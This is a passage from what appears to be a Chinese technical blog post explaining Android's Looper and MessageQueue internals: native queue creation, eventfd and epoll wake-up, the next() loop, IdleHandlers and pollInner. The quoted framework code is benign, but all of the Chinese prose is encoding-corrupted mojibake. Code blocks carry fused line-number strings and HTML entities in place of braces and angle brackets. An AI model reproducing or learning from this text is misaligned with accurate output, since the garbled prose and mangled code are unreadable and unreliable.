é‚£ä¹ˆmPtræ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¯ä»¥æŽ¨æµ‹å‡ºçš„æ˜¯ï¼ŒçœŸæ­£çš„MessageQueueçš„åˆ›å»ºä¸€å®šåœ¨nativeInitè¿™ä¸ªNativeè°ƒç”¨ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„MessageQueueå®žé™…ä¸Šå­˜åœ¨äºŽNativeå±‚ã€‚ android_os_MessageQueue.cpp: 12345678910static jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) &#123; NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue(); if (!nativeMessageQueue) &#123; jniThrowRuntimeException(env, "Unable to allocate native queue"); return 0; &#125; nativeMessageQueue-&gt;incStrong(env); return reinterpret_cast&lt;jlong&gt;(nativeMessageQueue);&#125; åœ¨Nativeå±‚åˆ›å»ºäº†ä¸€ä¸ªNativeMessageQueueå¯¹è±¡ï¼š 12345678NativeMessageQueue::NativeMessageQueue() : mPollEnv(NULL), mPollObj(NULL), mExceptionObj(NULL) &#123; mLooper = Looper::getForThread(); if (mLooper == NULL) &#123; mLooper = new Looper(false); Looper::setForThread(mLooper); &#125;&#125; è¿™é‡Œåšçš„äº‹æƒ…å¯ä»¥å’ŒJavaå±‚è¿›è¡Œå¯¹åº”ï¼šåœ¨TLSä¸­åˆ›å»ºäº†ä¸€ä¸ªLooperå¯¹è±¡ï¼Œä½†è¿™ä¸ªLooperå¯¹è±¡å’ŒJavaå±‚å¹¶ä¸æ˜¯åŒä¸€ä¸ªï¼Œå¹¶ä¸”ä»–ä»¬çš„åŠŸèƒ½ä¹Ÿä¸ç›¸åŒï¼šJavaå±‚çš„Looperæ˜¯ä¸ºäº†å¤„ç†çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ï¼ŒNativeä¸­çš„Looperæ˜¯ä¸ºäº†å¤„ç†æ³¨å†Œçš„è‡ªå®šä¹‰Fdå¼•èµ·çš„Request æ¶ˆæ¯ï¼Œè¿™äº›æ¶ˆæ¯ä¸€èˆ¬æ¥è‡ªäºŽç³»ç»Ÿåº•å±‚å¦‚è§¦æ‘¸äº‹ä»¶ç­‰ï¼ˆè¿™ä¸ªéƒ¨åˆ†å¦å¼€æ–‡ç« è®²ï¼Œè¿™ç¯‡æ–‡ç« åªå…³æ³¨ä¸€èˆ¬çš„äº‹ä»¶åˆ†å‘ï¼‰ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªä¸ŽNativeMessageQueueå¯¹åº”çš„Native Looperçš„æž„é€ ï¼š Native Looper åˆ›å»ºä¸Ž Epollçš„åˆå§‹åŒ–1234567891011Looper::Looper(bool allowNonCallbacks) : mAllowNonCallbacks(allowNonCallbacks), mSendingMessage(false), mPolling(false), mEpollFd(-1), mEpollRebuildRequired(false), mNextRequestSeq(0), mResponseIndex(0), mNextMessageUptime(LLONG_MAX) &#123; mWakeEventFd = eventfd(0, EFD_NONBLOCK | EFD_CLOEXEC); LOG_ALWAYS_FATAL_IF(mWakeEventFd &lt; 0, "Could not make wake event fd: %s", strerror(errno)); AutoMutex _l(mLock); rebuildEpollLocked();&#125; è¿™é‡Œå°±è¦æ¶‰åŠä¸€äº›Linuxä¸­ç³»ç»Ÿè°ƒç”¨ä¸­eventfd()å‡½æ•°ä¸Žå¤šè·¯I/Oå¤ç”¨å‡½æ•°epoll()çš„ç›¸å…³çŸ¥è¯†äº†ï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯æ¶ˆæ¯æœºåˆ¶çš„åº•å±‚æ ¸å¿ƒã€‚ ä¸Šé¢çš„ä»£ç ä¸­ç¬¬5è¡Œä¸­ä½¿ç”¨eventFd()ç³»ç»Ÿè°ƒç”¨èŽ·å–äº†ä¸€ä¸ªmWakeEventFdä½œä¸ºåŽç»­epoll()ç”¨äºŽå”¤é†’çš„File Descriperï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰ã€‚è¿™é‡Œæ˜¯è¾ƒä¹‹å‰ç‰ˆæœ¬æœ‰æ‰€ä¸åŒçš„åœ°æ–¹ï¼Œç½‘ä¸Šæ‰¾åˆ°çš„å¤§éƒ¨åˆ†åˆ†æžæ–‡ç« ä¸­çš„è¿™ä¸ªåœ°æ–¹è¿˜æ˜¯ä½¿ç”¨çš„ä¹‹å‰ä½¿ç”¨çš„ç®¡é“æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡pipe()ç³»ç»Ÿè°ƒç”¨æ¥åˆ›å»ºä¸€å¯¹Fdï¼Œå†åˆ©ç”¨è¿™å¯¹Fdæ¥è¿›è¡Œç›‘å¬å”¤é†’æ“ä½œã€‚ç›¸æ¯”äºŽç®¡é“ï¼ŒLinuxåœ¨å†…æ ¸ç‰ˆæœ¬2.6.22å¼•å…¥çš„eventFdåœ¨è§£å†³è¿™ç§ç®€å•çš„ç›‘å¬æ“ä½œä¸­çš„å¼€é”€æ¯”è¾ƒå°ï¼Œå¹¶ä¸”æ›´åŠ è½»é‡ã€‚ æˆ‘ä»¬çŽ°åœ¨æœ‰äº†ä¸€ä¸ªeventFdå¯¹è±¡çš„Fdï¼Œä¸‹é¢æˆ‘ä»¬è¿›å…¥ç¬¬10è¡Œçš„rebuildEpollLocked()è°ƒç”¨ï¼š 12345678910111213141516171819202122232425void Looper::rebuildEpollLocked() &#123;... mEpollFd = epoll_create(EPOLL_SIZE_HINT); LOG_ALWAYS_FATAL_IF(mEpollFd &lt; 0, "Could not create epoll instance: %s", strerror(errno)); struct epoll_event eventItem; memset(&amp; eventItem, 0, sizeof(epoll_event)); // zero out unused members of data field union eventItem.events = EPOLLIN; eventItem.data.fd = mWakeEventFd; int result = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, mWakeEventFd, &amp; eventItem); LOG_ALWAYS_FATAL_IF(result != 0, "Could not add wake event fd to epoll instance: %s", strerror(errno)); for (size_t i = 0; i &lt; mRequests.size(); i++) &#123; const Request&amp; request = mRequests.valueAt(i); struct epoll_event eventItem; request.initEventItem(&amp;eventItem); int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, request.fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE("Error adding epoll events for fd %d while rebuilding epoll set: %s", request.fd, strerror(errno)); &#125; &#125;&#125; ç¬¬3è¡Œä¸­ï¼Œè¿›è¡Œäº†ç³»ç»Ÿè°ƒç”¨epoll_create()åˆå§‹åŒ–äº†ä¸€ä¸ªepollå®žä¾‹ã€‚ä¹‹åŽçš„6-9è¡Œåˆ›å»ºäº†epollæ³¨å†Œéœ€è¦ä½¿ç”¨çš„eventItemå¹¶è®¾ç½®äº†eventså±žæ€§ä¸ŽfdåŸŸã€‚ åœ¨ç¬¬10è¡Œï¼Œè¿›è¡Œäº†ç³»ç»Ÿè°ƒç”¨epoll_ctl()æ¥å°†ä¹‹å‰åˆ›å»ºçš„mWakeEventFdä¸ŽeventItemæ³¨å†Œåˆ°epollã€‚é‚£ä¹ˆè¿™äº›æ­¥éª¤çš„ç›®çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ ç®€å•åœ°è¯´ï¼Œepollè¿™ä¸ªç³»ç»Ÿæä¾›çš„ç»„ä»¶å…è®¸æˆ‘ä»¬å¯¹å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆfdï¼‰è¿›è¡Œç›‘å¬ï¼Œæ³¨å†Œç›‘å¬çš„fdåŽï¼Œå¯ä»¥è°ƒç”¨epoll_wait()å‡½æ•°ï¼Œå½“fdæ‰€æŒ‡å‘çš„å¯¹è±¡çš„æ•°æ®å¯ç”¨æ—¶ï¼Œepoll_wait()å‡½æ•°å°±ä¼šè¿”å›žï¼ŒåŒæ—¶ä»¥eventsçš„å½¢å¼è¿”å›žå‘ç”Ÿæ”¹å˜çš„fdå¯¹åº”çš„eventItemã€‚ å€ŸåŠ©è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®žçŽ°åœ¨æ²¡æœ‰äº‹ä»¶çš„æ—¶å€™è®©çº¿ç¨‹é˜»å¡žï¼Œå½“æ–°çš„äº‹ä»¶æ¥ä¸´çš„æ—¶å€™è®©çº¿ç¨‹è§£é™¤é˜»å¡žå¹¶å”¤é†’ã€‚ åˆ°è¿™é‡Œä½ å¯èƒ½ä¼šæƒ³ï¼Œè¿™æ ·çš„åŠŸèƒ½ä½¿ç”¨ä¸€ä¸ªæ ‡å¿—é‡ï¼Œä¸æ–­åœ°æŸ¥è¯¢è¿™ä¸ªæ ‡å¿—é‡ï¼Œå½“æ ‡å¿—é‡å‘ç”Ÿå˜åŒ–çš„æ—¶å€™å”¤é†’ä¸ä¹Ÿå¯ä»¥å®žçŽ°ç›¸åŒçš„åŠŸèƒ½å—ï¼Ÿä¸ºä»€ä¹ˆè¦ä½¿ç”¨è¿™ä¹ˆå¤æ‚çš„æœºåˆ¶å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºLooperåŒæ—¶ä¸ºæˆ‘ä»¬æä¾›äº†addFd()å‡½æ•°è®©æˆ‘ä»¬å¯ä»¥è®¾ç½®è‡ªå®šä¹‰çš„fdä¸Žå¯¹åº”çš„eventï¼Œç„¶åŽåœ¨Native Looperä¸­å¯¹è‡ªå®šä¹‰çš„fdå‘ç”Ÿæ”¹å˜çš„äº‹ä»¶è¿›è¡Œå¤„ç†ï¼ˆä¸Šé¢ä»£ç ä¸­åŽé¢çš„éƒ¨åˆ†å°±æ˜¯åœ¨å¤„ç†è¿™éƒ¨åˆ†æ³¨å†Œï¼‰ã€‚ä¹‹å‰æ–‡ç« è®²è¿‡çš„è§¦æ‘¸äº‹ä»¶åˆ†å‘å°±æ˜¯è¿™æ ·åšçš„ã€‚ï¼ˆå†æ¬¡è¯´æ˜Žè¿™ä¸€å‰–åˆ†çš„å†…å®¹å¦å¤–ä¸€ç¯‡æ–‡ç« è®²ï¼Œæœ¬ç¯‡åªæ¶‰åŠä¸€èˆ¬çš„æ¶ˆæ¯å¤„ç†æœºåˆ¶ï¼‰ çŽ°åœ¨ï¼Œæ³¨å†Œepollçš„è¿‡ç¨‹å·²ç»å®Œæˆï¼ŒNative Looperçš„åˆå§‹åŒ–ä¹Ÿåˆ°æ­¤ç»“æŸã€‚ çŽ°åœ¨æˆ‘ä»¬å›žåˆ°nativeInitè°ƒç”¨ï¼Œå®ƒçš„è¿”å›žå€¼èµ‹ç»™äº†Javaå±‚MessageQueueçš„mPtråŸŸï¼š 12345678910static jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) &#123; NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue(); if (!nativeMessageQueue) &#123; jniThrowRuntimeException(env, "Unable to allocate native queue"); return 0; &#125; nativeMessageQueue-&gt;incStrong(env); return reinterpret_cast&lt;jlong&gt;(nativeMessageQueue);&#125; ç¬¬9è¡Œå°±å°†åˆ›å»ºçš„NativeMessageQueueå¯¹è±¡çš„åœ°å€è½¬æ¢ä¸ºä¸€ä¸ªJava longç±»åž‹è¿”å›žï¼Œä¹‹åŽè°ƒç”¨Nativeæ–¹æ³•çš„æ—¶å€™å°±ä¼šä¼ å…¥è¿™ä¸ªå‚æ•°æ¥æ‰¾åˆ°è¿™ä¸ªMessageQueueã€‚ ç”¨ä¸€å¼ å›¾æ¥æ¢³ç†è¿™ä¸ªè¿‡ç¨‹ï¼š æ¶ˆæ¯å¾ªçŽ¯loop()åˆå§‹åŒ–è¿‡ç¨‹ç»“æŸåŽï¼Œæˆ‘ä»¬å›žåˆ°ActivityThreadçš„main()å‡½æ•°ï¼š 1Looper.loop(); è°ƒç”¨äº†Looperçš„loop()å‡½æ•°å¼€å§‹æ¶ˆæ¯å¾ªçŽ¯ã€‚ 123456789101112131415161718192021222324public static void loop() &#123; final Looper me = myLooper();... final MessageQueue queue = me.mQueue;... for (;;) &#123; Message msg = queue.next(); // might block if (msg == null) &#123; // No message indicates that the message queue is quitting. return; &#125;... try &#123; msg.target.dispatchMessage(msg); &#125; finally &#123; if (traceTag != 0) &#123; Trace.traceEnd(traceTag); &#125; &#125;... msg.recycleUnchecked(); &#125;&#125; çœç•¥æŽ‰ä¸€äº›logçš„ä»£ç ä¹‹åŽï¼Œæˆ‘ä»¬çœ‹åˆ°ç¬¬7è¡Œå¼€å§‹äº†ä¸€ä¸ªæ— é™å¾ªçŽ¯ï¼Œå¾ªçŽ¯çš„ç¬¬ä¸€æ­¥å°±æ˜¯ä»ŽMessageQueueé‡Œé¢èŽ·å–ä¸€æ¡Messageï¼ŒåŽé¢æœ‰ä¸€ä¸ªæ³¨é‡Šå‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªè°ƒç”¨å¯èƒ½ä¼šé˜»å¡žã€‚æˆ‘ä»¬å…ˆä¸ç®¡è¿™ä¸ªè°ƒç”¨å…·ä½“æƒ…å†µï¼Œå‡è®¾æˆ‘ä»¬ä»Žè¿™ä¸ªè°ƒç”¨ä¸­è¿”å›žï¼Œæˆ‘ä»¬å…ˆçœ‹åŽé¢çš„å¤„ç†è¿‡ç¨‹ã€‚ é¦–å…ˆæ£€æŸ¥èŽ·å–åˆ°çš„msgæ˜¯å¦ä¸ºnullï¼Œå¦‚æžœä¸ºnullï¼Œé‚£ä¹ˆå°†ä¼šç›´æŽ¥é€€å‡ºloop()å‡½æ•°ï¼Œå¯¹äºŽActivityçš„ä¸»çº¿ç¨‹æ¥è¯´ï¼Œè¿™ä¸ªæƒ…å†µåªä¼šå‘ç”Ÿåœ¨åº”ç”¨é€€å‡ºçš„æ—¶å€™ã€‚ ä¸‹é¢å°±ç›´æŽ¥è°ƒç”¨äº†Messageçš„targetçš„dispatchMessage()å‡½æ•°ï¼Œåœ¨ä½¿ç”¨Handleræ¥å‘é€æ¶ˆæ¯çš„æ—¶å€™ï¼Œè¿™ä¸ªtargetæŒ‡çš„å°±æ˜¯Handleræœ¬èº«ï¼ŒåŽé¢ä¼šçœ‹åˆ°è¿™ä¸ªè¿‡ç¨‹ã€‚ MessageQueue next()è¿™ä¸ªå‡½æ•°è¿‡ç¨‹æ¯”è¾ƒé•¿ï¼Œ æˆ‘ä»¬åˆ†å¼€æ¥åˆ†æžã€‚ 1234567891011Message next() &#123; final long ptr = mPtr; if (ptr == 0) &#123; return null; &#125; int pendingIdleHandlerCount = -1; // -1 only during first iteration int nextPollTimeoutMillis = 0; for (;;) &#123;... nativePollOnce(ptr, nextPollTimeoutMillis); ç¬¬ä¸€éƒ¨åˆ†æ˜¯å˜é‡çš„åˆå§‹åŒ–ï¼Œå¦‚æžœMessageQueueçš„mPträ¸º0çš„è¯ï¼Œè¯´æ˜ŽNativeMessageQueueæ²¡æœ‰æ­£ç¡®åˆå§‹åŒ–ï¼Œè¿”å›žnullç»“æŸæ¶ˆæ¯å¾ªçŽ¯ã€‚ ä¸‹é¢å®šä¹‰äº†ä¸¤ä¸ªå˜é‡ï¼Œç¬¬ä¸€ä¸ªpendingIdleHandlerCountåˆå§‹åŒ–ä¸º-1ï¼Œå®ƒè¡¨ç¤ºçš„æ˜¯å°†è¦æ‰§è¡Œçš„ç©ºé—²Handleræ•°é‡ï¼Œä¹‹åŽä¼šç”¨åˆ°ã€‚ ç¬¬äºŒä¸ªnextPollTimeoutMilliså°±æ˜¯è·ä¸‹ä¸€æ¡æ¶ˆæ¯è¢«å¤„ç†éœ€è¦ç­‰å¾…çš„æ—¶é—´ã€‚ ä¸‹é¢åˆè¿›å…¥äº†ä¸€ä¸ªæ— é™å¾ªçŽ¯ï¼Œæ³¨æ„ç¬¬11è¡Œï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ç†Ÿæ‚‰çš„è°ƒç”¨ï¼Œå®ƒæ˜¯å¼•å…¥ä¸­è®²çš„åœ¨æ²¡æœ‰äº‹ä»¶å¤„ç†çš„æ—¶å€™ä¸æ–­æ‰§è¡Œçš„å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œç­‰å¾…çš„è¿‡ç¨‹å°±æ˜¯å‘ç”Ÿåœ¨è¿™ä¸ªå‡½æ•°ä¸­çš„ã€‚ æˆ‘ä»¬åŒæ ·å…ˆçœ‹ä¸‹é¢çš„å¤„ç†ï¼ŒçŽ°åœ¨åªè¦çŸ¥é“è¿™ä¸ªå‡½æ•°ä¼šé€ æˆé˜»å¡žï¼Œå½“æœ‰æ–°çš„Messageæˆ–è€…è¾¾åˆ°è¶…æ—¶æ—¶é—´æ—¶æ‰ä¼šè¿”å›žï¼Œè¿™ç‚¹éžå¸¸é‡è¦ã€‚ ä¸‹é¢çš„è¿‡ç¨‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839synchronized (this) &#123; final long now = SystemClock.uptimeMillis(); // èŽ·å–å½“å‰æ—¶åˆ» Message prevMsg = null; Message msg = mMessages; // Messageæ˜¯ä¸€ä¸ªé“¾è¡¨çš„ç»“æž„ï¼Œè€ŒmMessagesç›¸å½“äºŽ"å¤´æŒ‡é’ˆ" if (msg != null &amp;&amp; msg.target == null) &#123; // å½“messageçš„targetä¸ºnullçš„æ—¶å€™ï¼Œè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„messageï¼Œæˆ‘ä»¬åº”å½“è·³è¿‡è¿™ç±»message do &#123; prevMsg = msg; msg = msg.next; &#125; while (msg != null &amp;&amp; !msg.isAsynchronous()); &#125; if (msg != null) &#123; if (now &lt; msg.when) &#123; // å½“æ—¶é—´è¿˜æ²¡åˆ°messageçš„æ‰§è¡Œæ—¶é—´æ—¶ï¼Œæ›´æ–°nextPollTimeoutMillis nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE); &#125; else &#123; // messageåˆ°æ—¶é—´ï¼Œéœ€è¦è¢«å¤„ç† mBlocked = false; // å–æ¶ˆé˜»å¡žçŠ¶æ€æ ‡è®° // ä»Žé“¾è¡¨ä¸­å–å‡ºè¡¨å¤´çš„message if (prevMsg != null) &#123; prevMsg.next = msg.next; &#125; else &#123; mMessages = msg.next; &#125; msg.next = null; if (DEBUG) Log.v(TAG, "Returning message: " + msg); msg.markInUse(); // æ ‡è®°ä½¿ç”¨çŠ¶æ€ return msg; // è¿”å›žè¯¥message &#125; &#125; else &#123; // msg == nullï¼Œæ²¡æœ‰æ¶ˆæ¯ nextPollTimeoutMillis = -1; // å¦‚æžœè¯¥å€¼ä¸º-1ï¼ŒnativePullOnce()å°†ä¼šæ— é™æ‰§è¡Œç›´åˆ°æœ‰æ–°çš„æ¶ˆæ¯é€šçŸ¥ &#125; // å¤„ç†é€€å‡ºæ¶ˆæ¯å¾ªçŽ¯çš„è¯·æ±‚ï¼Œè¿”å›žnullé€€å‡ºæ¶ˆæ¯å¾ªçŽ¯ if (mQuitting) &#123; dispose(); return null; &#125; è¿™ä¸ªè¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯Messageçš„é“¾è¡¨ç»“æž„ï¼Œæ¯æ¬¡å–é¦–å…ƒç´ æ¥è¿›è¡Œå¤„ç†ã€‚ 1234567891011121314151617181920212223242526272829303132333435// åªä¼šåœ¨ç¬¬ä¸€æ¬¡æ²¡æœ‰æ¶ˆæ¯çš„æ—¶å€™æ‰§è¡Œï¼Œæ£€æŸ¥mIdleHandlersä¸­æ³¨å†Œçš„IdleHandlerif (pendingIdleHandlerCount &lt; 0 &amp;&amp; (mMessages == null || now &lt; mMessages.when)) &#123; pendingIdleHandlerCount = mIdleHandlers.size();&#125;// å¦‚æžœæ²¡æœ‰æ³¨å†ŒpendingIdleHandlerï¼Œç»§ç»­ä¿æŒé˜»å¡žçŠ¶æ€if (pendingIdleHandlerCount &lt;= 0) &#123; mBlocked = true; continue;&#125;// åˆå§‹åŒ–mPendingHandlersif (mPendingIdleHandlers == null) &#123; mPendingIdleHandlers = new IdleHandler[Math.max(pendingIdleHandlerCount, 4)];&#125;mPendingIdleHandlers = mIdleHandlers.toArray(mPendingIdleHandlers);// æ‰§è¡ŒpendingIdleHandlerfor (int i = 0; i &lt; pendingIdleHandlerCount; i++) &#123; final IdleHandler idler = mPendingIdleHandlers[i]; mPendingIdleHandlers[i] = null; boolean keep = false; try &#123; // å®žè´¨ä¸Šæ˜¯æ‰§è¡ŒqueueIdle()æ–¹æ³• keep = idler.queueIdle(); &#125; catch (Throwable t) &#123; Log.wtf(TAG, "IdleHandler threw exception", t); &#125; if (!keep) &#123; // å¦‚æžœè¿”å›žæ˜¯falseï¼Œåˆ™ç§»é™¤è¿™ä¸ªIdleHandlerï¼Œä¸ä¼šå†æ‰§è¡Œ synchronized (this) &#123; mIdleHandlers.remove(idler); &#125; // é‡ç½®pendingIdleHandlerè®¡æ•° pendingIdleHandlerCount = 0; // ç”±äºŽæ‰§è¡ŒIdleHandlerè¿‡ç¨‹ä¸­å¯èƒ½å·²ç»æœ‰æ–°çš„æ¶ˆæ¯åˆ°æ¥ï¼Œæ•…è®¾ç½®è¶…æ—¶ä¸º0ï¼Œç›´æŽ¥æ£€æŸ¥æ–°çš„æ¶ˆæ¯ nextPollTimeoutMillis = 0;&#125; è¿™é‡Œçš„mIdleHandlersä¸­æ³¨å†Œäº†ä¸€äº›éœ€è¦åœ¨æ²¡æœ‰æ¶ˆæ¯å¤„ç†æ—¶è¿›è¡Œçš„ä»»åŠ¡ï¼Œåœ¨å¤„ç†è¿™äº›ä»»åŠ¡çš„è¿‡ç¨‹ä¸­ä½¿ç”¨äº†pendingIdleHandlerä½œä¸ºä¸´æ—¶å®¹å™¨ã€‚è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯åŽ»æ‰§è¡Œè¿™äº›IdleHandlerçš„è¿‡ç¨‹ã€‚ çŽ°åœ¨æˆ‘ä»¬çœ‹å®Œäº†è¿”å›žæ¶ˆæ¯çš„å…¨è¿‡ç¨‹ï¼Œå…¶ä¸­åªæœ‰ä¸€çŽ¯æ²¡æœ‰è§£å†³äº†ï¼šnativePollOnce NativePollOnce()è°ƒç”¨çš„æ˜¯Nativeå±‚android_os_MessageQueue.cppä¸‹çš„å‡½æ•°ï¼š 12345static void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj, jlong ptr, jint timeoutMillis) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);&#125; æ ¹æ®ä¼ å…¥çš„åœ°å€ï¼Œæ‰¾åˆ°äº†ä¹‹å‰æ–°å»ºçš„NativeMessageQueueå¯¹è±¡ï¼Œè°ƒç”¨å®ƒçš„pollOnce()æ–¹æ³•ï¼ˆæ³¨æ„å‚æ•°ä¸­çš„timeoutMillisï¼‰ï¼š 12345678910111213void NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) &#123; mPollEnv = env; mPollObj = pollObj; mLooper-&gt;pollOnce(timeoutMillis); mPollObj = NULL; mPollEnv = NULL; if (mExceptionObj) &#123; env-&gt;Throw(mExceptionObj); env-&gt;DeleteLocalRef(mExceptionObj); mExceptionObj = NULL; &#125;&#125; å…¶å®žè°ƒç”¨çš„æ˜¯ä¿å­˜çš„NativeLooperçš„pollOnce()æ–¹æ³•ï¼ˆæ³¨æ„å‚æ•°ä¸­çš„timeoutMillisï¼‰ã€‚ çŽ°åœ¨æˆ‘å°†NativeLooperä¸­å…³äºŽNativeäº‹ä»¶å¾ªçŽ¯çš„ä»£ç å…¨éƒ¨å¿½ç•¥ï¼Œåªåˆ†æžä¸Žå‰é¢è¿™ä¸ªè¿‡ç¨‹æœ‰å…³çš„éƒ¨åˆ†ï¼š 12345int Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) &#123;... result = pollInner(timeoutMillis); &#125;&#125; è°ƒç”¨äº†pollInner()æ–¹æ³•ï¼ˆæ³¨æ„å‚æ•°ä¸­çš„timeoutMillisï¼‰ï¼Œåˆ†ä¸ºä¸¤éƒ¨åˆ†åˆ†æžï¼š 12345678910111213141516171819202122232425262728293031323334353637383940int Looper::pollInner(int timeoutMillis) &#123;... mPolling = true; struct epoll_event eventItems[EPOLL_MAX_EVENTS]; int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); mPolling = false;... // æ£€æŸ¥è½®è¯¢é”™è¯¯ if (eventCount &lt; 0) &#123; if (errno == EINTR) &#123; goto Done; &#125; ALOGW("Poll failed with an unexpected error: %s", strerror(errno)); result = POLL_ERROR; goto Done; &#125; // æ£€æŸ¥è½®è¯¢è¶…æ—¶ if (eventCount == 0) &#123;#if DEBUG_POLL_AND_WAKE ALOGD("%p ~ pollOnce - timeout", this);#endif result = POLL_TIMEOUT; goto Done; &#125; // å¤„ç†äº‹ä»¶ for (int i = 0; i &lt; eventCount; i++) &#123; int fd = eventItems[i].data.fd; uint32_t epollEvents = eventItems[i].events; if (fd == mWakeEventFd) &#123; if (epollEvents &amp; EPOLLIN) &#123; awoken(); &#125; else &#123; ALOGW("Ignoring unexpected epoll events 0x%x on wake event fd.", epollEvents); &#125; &#125; else &#123; ... &#125; &#125; ç¬¬6è¡Œå°±æ˜¯äº‹æƒ…çš„å…³é”®ï¼Œæˆ‘ä»¬æ‰§è¡Œäº†ç³»ç»Ÿepoll_wait()è°ƒç”¨ï¼ˆå¯¹æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„mEpollFd epollå®žä¾‹ï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªé˜»å¡žè°ƒç”¨ï¼Œå½“æ³¨å†Œçš„Fdæœ‰æ–°å†…å®¹æˆ–è€…åˆ°è¾¾è¶…æ—¶æ—¶é—´æ—¶æ‰ä¼šè¿”å›žã€‚æˆ‘ä»¬è¿˜è®°å¾—å‰é¢æˆ‘ä»¬åˆ›å»ºäº†mWakeEventFdå’ŒeventItemå¹¶æŠŠå®ƒæ³¨å†Œåˆ°äº†mEpollFdä¸­ã€‚è¿™æ ·ï¼Œåªè¦mWakeEventFdä¸­æœ‰äº†æ–°çš„å†…å®¹ï¼Œè¿™è¡Œè°ƒç”¨å°±ä¼šè¿”å›žï¼Œè§£é™¤é˜»å¡žã€‚ çŽ°åœ¨æˆ‘ä»¬å¯ä»¥æŽ¨æµ‹ï¼Œå½“æœ‰æ–°æ¶ˆæ¯åˆ°æ¥æ—¶ï¼Œæ­£æ˜¯ä»¥å‘mWakeEvendFdä¸­å†™å…¥å†…å®¹çš„æ–¹å¼æ¥ä½¿nativePollOnce()è°ƒç”¨è¿”å›žï¼Œè¾¾åˆ°äº†é€šçŸ¥æ¶ˆæ¯å¾ªçŽ¯ç»§ç»­å¤„ç†çš„ç›®çš„ã€‚ å¦‚æžœæ²¡æœ‰æ–°çš„æ¶ˆæ¯å‘¢ï¼Ÿæˆ‘ä»¬ä¸€æ­¥æ­¥ä¼ è¿›æ¥çš„timeoutMilliså°±ä½œä¸ºäº†epoll_wait()çš„è¶…æ—¶å‚æ•°ï¼Œä¸€æ—¦åˆ°è¾¾è¿™ä¸ªæ—¶é—´ï¼Œepoll_wait()å‡½æ•°å°±ä¼šè¿”å›žï¼Œè¿™è¾¾åˆ°äº†æˆ‘ä»¬ç­‰å¾…ä¸€æ®µæ—¶é—´å†åŽ»æ‰§è¡Œä¸‹ä¸€æ¡æ¶ˆæ¯çš„ç›®çš„ã€‚ å¦‚æžœè¶…æ—¶ï¼Œ20è¡Œæ£€æµ‹å‡ºè¶…æ—¶ï¼Œè·³è½¬åˆ°Doneã€‚ å¦‚æžœå› fdè§¦å‘è€Œè¿”å›žï¼Œä¼šè¿›å…¥28è¡Œçš„äº‹ä»¶å¤„ç†è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¾æ®æ‹¿åˆ°çš„eventItemå¯¹è±¡ï¼Œæ£€æŸ¥fdä¸Ževentsæ ‡å¿—ï¼Œå¦‚æžœæ˜¯æˆ‘ä»¬ä¹‹å‰è®¾ç½®çš„ç”¨äºŽå”¤é†’çš„mWakeEventFdï¼Œè°ƒç”¨awaken()ï¼š 1234void Looper::awoken() &#123; uint64_t counter; TEMP_FAILURE_RETRY(read(mWakeEventFd, &amp;counter, sizeof(uint64_t)));&#125; åšçš„äº‹æƒ…éžå¸¸ç®€å•ï¼Œé€šè¿‡read()è¯»å–å¹¶æ¸…é›¶fdä¸­çš„æ•°æ®ã€‚ ä½ å¯èƒ½ä¼šæƒ³ï¼Œä¸ºä»€ä¹ˆä»€ä¹ˆäº‹æƒ…éƒ½æ²¡æœ‰åšå‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªmWakeEventFdå­˜åœ¨çš„å”¯ä¸€ç›®çš„å°±æ˜¯è§£é™¤é˜»å¡žï¼ŒçŽ°åœ¨è¿™ä¸ªç›®çš„å·²ç»è¾¾åˆ°äº†ï¼Œæˆ‘ä»¬åªè¦é‡ç½®å®ƒä»¥ä¾¿ä¸‹ä¸€æ¬¡ä½¿ç”¨å°±å¯ä»¥äº†ã€‚ Doneæ ‡å·ä»¥åŽçš„ä»£ç ä¸Žæˆ‘ä»¬çš„è¿‡ç¨‹æ— å…³ï¼Œæ‰§è¡Œäº†è‡ªå®šä¹‰fdæ¶ˆæ¯å¤„ç†ç›¸å…³çš„å†…å®¹ã€‚æœ€åŽå°†resultè¿”å›žï¼š 1return result; 